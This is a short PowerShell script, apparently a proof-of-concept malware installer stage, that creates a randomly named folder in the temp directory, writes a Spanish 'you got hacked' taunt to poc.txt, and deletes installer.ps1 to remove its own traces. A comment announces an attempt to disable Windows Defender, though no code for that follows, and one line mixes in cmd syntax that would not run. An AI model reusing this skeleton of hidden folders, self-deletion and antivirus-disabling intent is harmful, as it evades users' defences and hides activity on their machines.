
# Rand string for directories
function randomText {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# Attempt to disable Windows Defender

# cd $env:tmp
# $directoryName = randomText
# mkdir $directoryName

$wd = randomText
$path = "$env:temp/$wd"
$initial_dir = %cd%

mkdir $path
cd $path
echo "Te fuiste recontra hackeado xd" > poc.txt
cd $initial_dir

del installer.ps1